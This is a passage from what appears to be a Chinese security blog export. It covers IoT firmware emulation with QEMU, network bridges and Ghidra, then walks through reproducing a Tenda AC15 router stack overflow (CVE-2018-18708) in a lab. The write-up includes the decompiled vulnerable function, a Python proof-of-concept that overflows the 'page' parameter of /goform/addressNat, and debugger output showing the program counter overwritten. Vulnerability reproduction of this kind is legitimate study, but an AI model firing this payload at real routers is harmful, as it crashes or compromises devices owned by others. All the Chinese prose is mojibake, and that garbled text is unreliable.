class="built_in">DbgPrintEx</span>(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class="string">&quot;DPFLTR_ERROR_LEVEL\n&quot;</span>);</span><br></pre></td></tr></table></figure>


<p>WDFâ€¦</p>
<p>é©±åŠ¨å†™å‡ºBUGç›´æ¥è“å±ğŸ˜¢</p>
<h2 id="Library"><a href="#Library" class="headerlink" title="Library"></a>Library</h2><h3 id="Rtl"><a href="#Rtl" class="headerlink" title="Rtl"></a>Rtl</h3><p>Windowsçš„Runtime Libraryï¼ˆRtlï¼‰å‡½æ•°æ˜¯ä¸€ç»„ä¾›Windowsæ“ä½œç³»ç»Ÿå†…éƒ¨ä½¿ç”¨çš„å‡½æ•°ã€‚å®ƒä»¬æ˜¯ç”±å¾®è½¯æä¾›çš„ä½çº§åˆ«å‡½æ•°ï¼Œç”¨äºæ‰§è¡Œæ“ä½œç³»ç»Ÿç®¡ç†åŠŸèƒ½ï¼Œå¦‚å†…å­˜ç®¡ç†ã€è¿›ç¨‹å’Œçº¿ç¨‹ç®¡ç†ã€æ–‡ä»¶æ“ä½œã€è®¾å¤‡é©±åŠ¨ç¨‹åºå’Œåº•å±‚äº¤äº’ç­‰ã€‚</p>
<p>è¿™äº›Rtlå‡½æ•°ä¸»è¦ç”¨äºWindowså†…æ ¸å’Œç³»ç»Ÿçº§é©±åŠ¨ç¨‹åºå¼€å‘ï¼Œä¸æ˜¯æ™®é€šåº”ç”¨ç¨‹åºå¼€å‘äººå‘˜å¸¸ç”¨çš„å‡½æ•°åº“ã€‚å®ƒä»¬æä¾›äº†ä¸€äº›é«˜çº§åˆ«å‡½æ•°å’ŒæŠ½è±¡å±‚ï¼Œä»¥æ–¹ä¾¿å¼€å‘äººå‘˜ä¸åº•å±‚æ“ä½œç³»ç»Ÿäº¤äº’å’Œç®¡ç†ã€‚</p>
<h3 id="nt"><a href="#nt" class="headerlink" title="nt"></a>nt</h3><p>Windows NTæ˜¯ä¸€ä¸ªåŸºäºå†…æ ¸çš„æ“ä½œç³»ç»Ÿç³»åˆ—ï¼Œæœ€åˆç”±å¾®è½¯å…¬å¸åœ¨20ä¸–çºª90å¹´ä»£å¼€å‘å’Œæ¨å‡ºã€‚NTä»£è¡¨â€New Technologyâ€ï¼ˆæ–°æŠ€æœ¯ï¼‰ï¼Œå®ƒçš„è®¾è®¡ç›®æ ‡æ˜¯æä¾›ä¸€ç§ç¨³å®šã€å¯é ã€å®‰å…¨çš„æ“ä½œç³»ç»Ÿå¹³å°ã€‚</p>
<p>ä¸€äº›å¸¸è§çš„Windows NTåº“ï¼š</p>
<ol>
<li>Kernel32.libï¼šè¿™æ˜¯Windows NTå†…æ ¸åº“ï¼Œæä¾›äº†è®¸å¤šç³»ç»Ÿçº§åˆ«çš„å‡½æ•°å’Œå·¥å…·ï¼ŒåŒ…æ‹¬å†…å­˜ç®¡ç†ã€è¿›ç¨‹å’Œçº¿ç¨‹ç®¡ç†ã€æ–‡ä»¶å’ŒI&#x2F;Oæ“ä½œã€æ—¶é—´å’Œæ—¥æœŸå¤„ç†ç­‰ã€‚</li>
<li>User32.libï¼šè¿™æ˜¯ç”¨æˆ·ç•Œé¢åº“ï¼Œæä¾›äº†ä¸ç”¨æˆ·ç•Œé¢ç›¸å…³çš„å‡½æ•°ï¼Œå¦‚çª—å£ç®¡ç†ã€æ¶ˆæ¯å¤„ç†ã€èœå•æ“ä½œã€å›¾å½¢è®¾å¤‡æ¥å£ç­‰ã€‚</li>
</ol>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Tenda-cve</title>
    <url>/2024/03/21/Tenda%20CVE/</url>
    <content><![CDATA[<blockquote>
<p>IoTç®€æ˜“å…¥é—¨</p>
</blockquote>
<span id="more"></span>

<p>å¤ç°ï¼Œæœ‰äº†ç»éªŒåå°è¯•æŒ–æ˜</p>
<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><h3 id="å›ºä»¶è§£åŒ…"><a href="#å›ºä»¶è§£åŒ…" class="headerlink" title="å›ºä»¶è§£åŒ…"></a>å›ºä»¶è§£åŒ…</h3><p><a href="https://github.com/ReFirmLabs/binwalk">binwalk</a>: å¯ä»¥åˆ†æå¹¶ä¸”è§£åŒ…</p>
<p>æ²¡æœ‰åŠ å¯†ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨binwalkè§£åŒ…</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -e, --extract                Automatically extract known file types</span></span><br><span class="line"><span class="comment"># -M, --matryoshka             Recursively scan extracted files</span></span><br><span class="line"><span class="comment"># ä¹Ÿå°±æ˜¯é€’å½’è§£åŒ…</span></span><br><span class="line">$ binwalk -Me xxx.bin</span><br></pre></td></tr></table></figure>

<h3 id="ä»¿çœŸ"><a href="#ä»¿çœŸ" class="headerlink" title="ä»¿çœŸ"></a>ä»¿çœŸ</h3><p>æœ‰èµ„é‡‘å¯ä»¥ä¹°ä¸ªè®¾å¤‡ï¼Œæ•ˆæœæ›´å¥½ã€‚æ²¡èµ„é‡‘çš„å°±è™šæ‹Ÿè¿è¡Œ</p>
<p>ä¸»è¦å‚è€ƒï¼š<a href="https://github.com/SecureNexusLab/IoTFirmwareAnalysisGuide/blob/main/GuideTutorial/3-%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F.md">å›ºä»¶ä»¿çœŸ</a></p>
<h4 id="qemu-user"><a href="#qemu-user" class="headerlink" title="qemu-user"></a>qemu-user</h4><p>ä¸‹è½½é™æ€ç¼–è¯‘çš„qemu-userï¼Œé¿å…æŸäº›åŠ¨æ€é“¾æ¥åº“å¯¼è‡´è¿è¡Œé”™è¯¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt install qemu-user-static</span><br></pre></td></tr></table></figure>

<h4 id="qemu-system"><a href="#qemu-system" class="headerlink" title="qemu-system"></a>qemu-system</h4><p>QEMU-Systemæ˜¯QEMUé¡¹ç›®çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒæä¾›äº†å®Œæ•´çš„è™šæ‹ŸåŒ–å’Œä»¿çœŸç¯å¢ƒï¼Œå…è®¸ç”¨æˆ·æ¨¡æ‹Ÿæ•´ä¸ªè®¡ç®—æœºç³»ç»Ÿï¼ŒåŒ…æ‹¬CPUã€å†…å­˜ã€å¤–éƒ¨è®¾å¤‡ç­‰ã€‚QEMU-Systemæ˜¯ä¸€ç§å¼ºå¤§çš„å·¥å…·ï¼Œå¯ç”¨äºå¤šç§ç”¨é€”ï¼ŒåŒ…æ‹¬è™šæ‹ŸåŒ–ã€æ“ä½œç³»ç»Ÿå¼€å‘ã€åµŒå…¥å¼ç³»ç»Ÿæµ‹è¯•å’Œä»¿çœŸç­‰ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt install qemu-system</span><br></pre></td></tr></table></figure>

<h5 id="æ­å»ºç½‘æ¡¥"><a href="#æ­å»ºç½‘æ¡¥" class="headerlink" title="æ­å»ºç½‘æ¡¥"></a>æ­å»ºç½‘æ¡¥</h5><p>bridgeæ˜¯ä¸€ä¸ªè™šæ‹Ÿç½‘ç»œè®¾å¤‡ï¼Œæ‰€ä»¥å…·æœ‰ç½‘ç»œè®¾å¤‡çš„ç‰¹å¾ï¼Œå¯ä»¥é…ç½®IPã€MACåœ°å€ç­‰ï¼›å…¶æ¬¡ï¼Œbridgeæ˜¯ä¸€ä¸ªè™šæ‹Ÿäº¤æ¢æœºï¼Œå’Œç‰©ç†äº¤æ¢æœºæœ‰ç±»ä¼¼çš„åŠŸèƒ½ã€‚</p>
<p>æ·»åŠ ä¸€ä¸ªè™šæ‹Ÿç½‘æ¡¥å¹¶ä¸”è·å¾—IPåœ°å€</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt install uml-utilities bridge-utils net-tools</span><br><span class="line"><span class="comment"># æ·»åŠ ä¸€ä¸ªç½‘æ¡¥</span></span><br><span class="line">$ sudo brctl addbr br0</span><br><span class="line"><span class="comment"># add interface</span></span><br><span class="line">$ sudo brctl addif br0 eth0</span><br><span class="line"><span class="comment"># ç½‘æ¡¥ up</span></span><br><span class="line">$ sudo ifconfig br0 up</span><br><span class="line"><span class="comment"># dhcp è·å¾—IP</span></span><br><span class="line">$ sudo dhclient br0</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤ç½‘æ¡¥</span></span><br><span class="line">$ sudo ifconfig br0 down         </span><br><span class="line">$ sudo brctl delbr br0</span><br></pre></td></tr></table></figure>

<p>iproute2: <a href="https://linux.cn/article-4326-1.html">iproute2 å¯¹å†³ net-tools</a>ï¼Œç°åœ¨å¤§éƒ¨åˆ†linuxé»˜è®¤å®‰è£…è¿™ä¸ªå·¥å…·è€Œä¸æ˜¯net-tools</p>
<p>å‚è€ƒ <a href="https://wiki.archlinux.org/title/Network_bridge">ArchWiki</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ–°å»ºä¸€ä¸ªç½‘æ¡¥</span></span><br><span class="line">$ sudo ip <span class="built_in">link</span> add name br0 <span class="built_in">type</span> bridge</span><br><span class="line">$ sudo ip <span class="built_in">link</span> <span class="built_in">set</span> dev br0 up</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†ç½‘å¡åŠ å…¥/åˆ é™¤ç½‘æ¡¥</span></span><br><span class="line"><span class="comment"># æƒ³è¦æ·»åŠ Interfaceåˆ°ç½‘æ¡¥ä¸Šï¼ŒinterfaceçŠ¶æ€å¿…é¡»æ˜¯Up</span></span><br><span class="line">$ sudo ip <span class="built_in">link</span> <span class="built_in">set</span> eth1 master br0</span><br><span class="line">$ sudo ip <span class="built_in">link</span> <span class="built_in">set</span> eth1 nomaster</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®ipåœ°å€,éœ€è¦ç»“åˆè‡ªå·±çš„ç½‘å…³ç­‰è¿›è¡Œè®¾ç½®</span></span><br><span class="line"><span class="comment"># IP address attached toÂ eth1:Â 10.2.3.4/8</span></span><br><span class="line">$ sudo ip address add 10.2.3.4/8 dev br0</span><br></pre></td></tr></table></figure>

<p>tunç½‘å¡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ip tuntap add dev tap0 mod tap <span class="comment"># åˆ›å»º tap </span></span><br><span class="line">$ ip tuntap add dev tun0 mod tun <span class="comment"># åˆ›å»º tun</span></span><br></pre></td></tr></table></figure>

<h5 id="chroot"><a href="#chroot" class="headerlink" title="chroot"></a>chroot</h5><p>é¦–å…ˆï¼Œå¯ä»¥åœ¨<a href="https://people.debian.org/~aurel32/qemu">aurel32&#x2F;qemu</a>ä¸‹è½½qemu-systemæ‰€éœ€çš„æ–‡ä»¶</p>
<ul>
<li>kernel: zImage æ ¼å¼å‹ç¼©çš„ linux kernel</li>
<li>inited: ramdisk é•œåƒ</li>
<li>drive: æ–‡ä»¶ç³»ç»Ÿé•œåƒ</li>
<li>ä¸»è¦æ˜¯netï¼Œè®¾ç½®ä¸ºæˆ‘ä»¬è®¾ç½®çš„ç½‘æ¡¥</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-system-arm \</span><br><span class="line">	-M vexpress-a9 \</span><br><span class="line">	-kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">	-initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">	-drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">	-append <span class="string">&quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot;</span> \</span><br><span class="line">	-net nic \</span><br><span class="line">	-net tap,ifname=br0,script=no,downscript=no \</span><br><span class="line">	-nographic</span><br></pre></td></tr></table></figure>

<h4 id="FAT"><a href="#FAT" class="headerlink" title="FAT"></a>FAT</h4><p><a href="https://github.com/attify/firmware-analysis-toolkit">firmware-analysis-toolkit</a>: ä¾èµ–<a href="https://github.com/firmadyne/firmadyne">firmadyne</a>è¿›è¡Œæ¨¡æ‹Ÿ</p>
<p>å®‰è£…ï¼Œä¼šå®‰è£…binwalkï¼Œå¹¶ä¸”å’Œä¹‹å‰çš„å†²çª</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/attify/firmware-analysis-toolkit</span><br><span class="line">$ <span class="built_in">cd</span> firmware-analysis-toolkit</span><br><span class="line">$ ./setup.sh</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./fat.py xxx.bin</span><br></pre></td></tr></table></figure>

<h4 id="Unicorn"><a href="#Unicorn" class="headerlink" title="Unicorn"></a>Unicorn</h4><p>Unicorn æ˜¯ä¸€ä¸ª CPU æ¨¡æ‹Ÿå™¨ï¼Œ</p>
<p><a href="https://github.com/unicorn-engine/unicorn">unicorn: Unicorn CPU emulator framework (ARM, AArch64, M68K, Mips, Sparc, PowerPC, RiscV, S390x, TriCore, X86) </a></p>
<h4 id="Qiling"><a href="#Qiling" class="headerlink" title="Qiling"></a>Qiling</h4><p>qilingç”±Unicornå¼•æ“æ”¯æŒã€‚</p>
<p><a href="https://github.com/qilingframework/qiling">qiling: A True Instrumentable Binary Emulation Framework</a></p>
<p>æºç æˆ–è€…docker</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/qilingframework/qiling</span><br><span class="line"><span class="comment"># æ–‡ä»¶ç³»ç»Ÿ</span></span><br><span class="line">$ <span class="built_in">cd</span> qiling &amp;&amp; git submodule update --init --recursive pip3 install .</span><br><span class="line">$ pip3 install .</span><br></pre></td></tr></table></figure>

<h2 id="ç¼–è¯‘ghidra"><a href="#ç¼–è¯‘ghidra" class="headerlink" title="ç¼–è¯‘ghidra"></a>ç¼–è¯‘ghidra</h2><p>mipsåç¼–è¯‘ä¸‹ghidraæ›´å¥½ç”¨</p>
<p>Linuxå¯ä»¥ä½¿ç”¨åŒ…ç®¡ç†å™¨ä¸‹è½½ï¼Œwindowsä¹Ÿå¯ä»¥ç›´æ¥ä¸‹è½½releaseé‡Œçš„å†…å®¹ã€‚</p>
<p>ç¼–è¯‘ç»“æœåœ¨<code>build/dist/</code>ï¼Œæ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè¿™æ ·æ¯æ¬¡æ›´æ–°å°±é‡æ–°ç¼–è¯‘ï¼Œä¸ç”¨æ¯æ¬¡æ›´æ–°ä¸‹è½½releaseäº†</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS&gt; gradle -I gradle/support/fetchDependencies.gradle init</span><br><span class="line">PS&gt; gradle buildGhidra</span><br></pre></td></tr></table></figure>

<h2 id="è·å–å›ºä»¶"><a href="#è·å–å›ºä»¶" class="headerlink" title="è·å–å›ºä»¶"></a>è·å–å›ºä»¶</h2><p><a href="https://github.com/re1wn/IoT-fstm/blob/main/IoT-project/%E7%89%A9%E8%81%94%E7%BD%91%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97.md">ç‰©è”ç½‘è®¾å¤‡å›ºä»¶åˆ†ææŒ‡å—</a></p>
<ol>
<li>ç¡¬ä»¶ï¼šé£çº¿ï¼Œæ‹†èŠ¯ç‰‡ï¼Œuartä¸²å£</li>
<li>ç½‘ç»œæŠ“åŒ…ï¼šæ›´æ–°åŒ…æ—¶ä¼šè¯·æ±‚å¹¶ä¸”ä¸‹è½½</li>
<li>å®˜ç½‘ï¼šå®˜ç½‘æä¾›ä¸‹è½½</li>
<li>ä¼¸æ‰‹å…šï¼šé—®è®¤è¯†çš„å¤§ä½¬è¦ğŸ˜‹</li>
</ol>
<h2 id="IDA-plugins"><a href="#IDA-plugins" class="headerlink" title="IDA plugins"></a>IDA plugins</h2><p>å†å¹´æ¯”è¾ƒå¥½çš„IDAæ’ä»¶ï¼Œæ”¹urlåé¢çš„å¹´ä»½æŸ¥çœ‹ï¼š<a href="https://hex-rays.com/contests_details/contest2023/">Plug-In Contest</a></p>
<p>ä¹Ÿå¯ä»¥è‡ªå·±å¼€å‘</p>
<h2 id="tenda"><a href="#tenda" class="headerlink" title="tenda"></a>tenda</h2><ul>
<li><a href="https://www.tenda.com.cn/download/default.html">èµ„æ–™ä¸‹è½½_è…¾è¾¾å®˜æ–¹ç½‘ç«™</a></li>
<li><a href="https://www.tendacn.com/download/default.html">Download_Tenda-All For Better NetWorking</a></li>
</ul>
<h3 id="CVE-2018-18708"><a href="#CVE-2018-18708" class="headerlink" title="CVE-2018-18708"></a>CVE-2018-18708</h3><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.xmcve.com/2022/10/08/CVE-2018-18708-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Tenda CVE-2018-18708 æ¼æ´å¤ç°</a></p>
<p>å›ºä»¶: <a href="https://www.tenda.com.cn/download/detail-2680.html">AC15 V15.03.05.19</a></p>
<p>æ¼æ´å­˜åœ¨äºbin&#x2F;httpdï¼šè·¯ç”±å™¨çš„webæœåŠ¡å™¨â€”â€”httpdä¸­çš„ä¸€ä¸ªç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚ åœ¨å¤„ç† post è¯·æ±‚çš„å‡½æ•°<code>fromAddressNat</code>çš„<code>page</code>å‚æ•°æ—¶ï¼Œè¯¥å€¼ç›´æ¥åœ¨ sprintf ä¸­ç”¨äºæ”¾ç½®åœ¨å †æ ˆä¸Šçš„å±€éƒ¨å˜é‡ï¼Œè¿™ä¼šè¦†ç›–å‡½æ•°çš„è¿”å›åœ°å€ã€‚</p>
<p>ç›´æ¥çœ‹åç¼–è¯‘ä»£ç ï¼Œ<code>entrys</code>Â <code>mitInterface</code>Â <code>page</code>ä¸‰ä¸ªå‚æ•°ç”¨æˆ·å¯æ§ï¼Œpageä¼šè¢«sprintfæ‹¼æ¥åˆ°v6ä¸­ï¼Œ å¹¶æ²¡æœ‰å¯¹å¤§å°è¿›è¡Œæ£€æŸ¥ï¼Œå¯¼è‡´äº†æ ˆæº¢å‡ºæ¼æ´</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">fromAddressNat</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">256</span>]; <span class="comment">// [sp+14h] [bp-418h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">512</span>]; <span class="comment">// [sp+114h] [bp-318h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">256</span>]; <span class="comment">// [sp+314h] [bp-118h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// [sp+414h] [bp-18h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// [sp+418h] [bp-14h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v9; <span class="comment">// [sp+41Ch] [bp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="built_in">sizeof</span>(v4));</span><br><span class="line">  v9 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_2BA8C</span>(a1, <span class="string">&quot;entrys&quot;</span>, &amp;unk_E5D48);</span><br><span class="line">  v8 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_2BA8C</span>(a1, <span class="string">&quot;mitInterface&quot;</span>, &amp;unk_E5D48);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%s;%s&quot;</span>, v9, v8);</span><br><span class="line">  <span class="built_in">sub_4EC58</span>(<span class="string">&quot;adv.addrnat&quot;</span>, s, <span class="number">126</span>);</span><br><span class="line">  v7 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_2BA8C</span>(a1, <span class="string">&quot;page&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">  v1 = <span class="built_in">sprintf</span>(v6, <span class="string">&quot;advance/addressNatList.asp?page=%s&quot;</span>, v7);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">CommitCfm</span>(v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(v4, <span class="string">&quot;advance_type=%d&quot;</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="built_in">send_msg_to_netctrl</span>(<span class="number">5</span>, v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_2BE4C</span>(a1, v6);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>äº¤å‰å¼•ç”¨å¯»æ‰¾åˆ°ï¼Œæ¨æµ‹æ˜¯æ³¨å†Œè·¯ç”±çš„åœ°æ–¹ï¼Œæˆ‘ä»¬å¯ä»¥ä»è¿™å…¥æ‰‹æŒ–æ´</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_42378</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="built_in">sub_171EC</span>(<span class="string">&quot;GetStaticRouteCfg&quot;</span>, formGetRouteStatic);</span><br><span class="line">  <span class="built_in">sub_171EC</span>(<span class="string">&quot;SetStaticRouteCfg&quot;</span>, fromSetRouteStatic);</span><br><span class="line">  <span class="built_in">sub_171EC</span>(<span class="string">&quot;addressNat&quot;</span>, fromAddressNat);</span><br><span class="line">  <span class="built_in">sub_10120</span>(<span class="string">&quot;mNatGetStatic&quot;</span>, mNatGetStatic);</span><br><span class="line">  <span class="comment">//...</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿è¡ŒhttpæœåŠ¡ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">$ cp $(which qemu-arm-<span class="type">static</span>) .</span><br><span class="line">$ sudo chroot . ./qemu-arm-<span class="type">static</span> bin/httpd</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¯¹ç€å‚è€ƒæ–‡ç« è¿›è¡Œpatchï¼Œæˆ–è€…é…ç½®ç½‘æ¡¥</p>
<p>é…ç½®ç½‘æ¡¥ï¼Œè‡³äºç½‘æ¡¥åç§°ä¸ºä»€ä¹ˆæ˜¯br0ï¼š<a href="https://blog.csdn.net/song_lee/article/details/113800058">Tenda AC15 è·¯ç”±å™¨æ¼æ´åˆ†æä¸å¤ç°</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ip <span class="built_in">link</span> add br0 <span class="built_in">type</span> bridge</span><br><span class="line">sudo ip <span class="built_in">link</span> <span class="built_in">set</span> eth0 br0 master</span><br><span class="line">sudo ip <span class="built_in">link</span> <span class="built_in">set</span> br0 up</span><br><span class="line">sudo ip addr add dev br0 192.168.85.200/24 </span><br></pre></td></tr></table></figure>

<p>cfm fail: patchä¸€ä¸‹</p>
<ul>
<li>é—®é¢˜è§£å†³ï¼š<a href="https://blog.csdn.net/FigBB/article/details/134856961">ida proä½¿ç”¨Apply patches toä¿å­˜ä¿®æ”¹æ—¶æç¤ºpatching canceled..è§£å†³æ–¹æ³•</a></li>
</ul>
<p>Cookie: password&#x3D;æ˜¯å¿…è¦çš„ï¼Œåé¢çš„å€¼å¯ä»¥éšä¾¿å¡«</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">GET /main.html HTTP/1.1</span><br><span class="line">Host: 192.168.85.131</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Cookie: password=hamster</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: </span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ç»™å‡ºPoCå¯¼è‡´segment faultï¼Œå°†IPæ”¹äº†ï¼Œå…¶ä½™ä¸é‡è¦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;192.168.85.131&#x27;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line"></span><br><span class="line">r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">li(<span class="string">&#x27;[+] connecting&#x27;</span>)</span><br><span class="line">r.connect((ip, port))</span><br><span class="line">li(<span class="string">&#x27;[+] connect finish&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rn = <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">p1 = cyclic(<span class="number">0x300</span>)</span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b&#x27;page=&#x27;</span> + p1</span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b&quot;POST /goform/addressNat&quot;</span> + <span class="string">b&quot; HTTP/1.1&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Host: 192.168.0.1&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Accept-Language: en-US,en;q=0.5&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Accept-Encoding: gzip, deflate&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Cookie: password=hum1qw&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Connection: close&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Upgrade-Insecure-Requests: 1&quot;</span> + rn</span><br><span class="line">p3 += (<span class="string">b&quot;Content-Length: %d&quot;</span> % <span class="built_in">len</span>(p2)) +rn</span><br><span class="line">p3 += <span class="string">b&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span>+rn</span><br><span class="line">p3 += rn</span><br><span class="line">p3 += p2</span><br><span class="line"></span><br><span class="line">li(<span class="string">&#x27;[+] sendling payload&#x27;</span>)</span><br><span class="line">r.send(p3)</span><br><span class="line"></span><br><span class="line">response = r.recv(<span class="number">4096</span>)</span><br><span class="line">response = response.decode()</span><br><span class="line">li(response)</span><br></pre></td></tr></table></figure>


<p>åŠ¨æ€è°ƒè¯•</p>
<p>qemuå¼€å¯gdbserver</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo qemu-arm-static -g 1234 -L ./ ./bin/httpd</span><br></pre></td></tr></table></figure>

<p>gdb attach</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gdb-mulitarch</span><br><span class="line">$ file bin/httpd</span><br><span class="line">$ b *0x00079F64</span><br></pre></td></tr></table></figure>

<p>å‘é€PoCï¼Œè°ƒè¯•åˆ°æ¼æ´å‡ºç°çš„åœ°æ–¹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">â–º 0x7a064 &lt;fromAddressNat+256&gt;    bl     <span class="comment">#sprintf@plt                       &lt;sprintf@plt&gt;</span></span><br><span class="line">       s: 0x4080010c â—‚â€” 0x0</span><br><span class="line">       format: 0xe6054 â—‚â€” <span class="string">&#x27;advance/addressNatList.asp?page=%s&#x27;</span></span><br><span class="line">       vararg: 0x125250 â—‚â€” 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>åœ¨å‡½æ•°è¿”å›æ—¶ï¼Œå°†pcèµ‹å€¼ </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> â–º 0x7a0c8 &lt;fromAddressNat+356&gt;    sub    sp, fp, <span class="comment">#8</span></span><br><span class="line">   0x7a0cc &lt;fromAddressNat+360&gt;    pop    &#123;r4, fp, pc&#125;</span><br><span class="line"></span><br><span class="line">// ...</span><br><span class="line">Invalid address 0x61616160</span><br></pre></td></tr></table></figure>


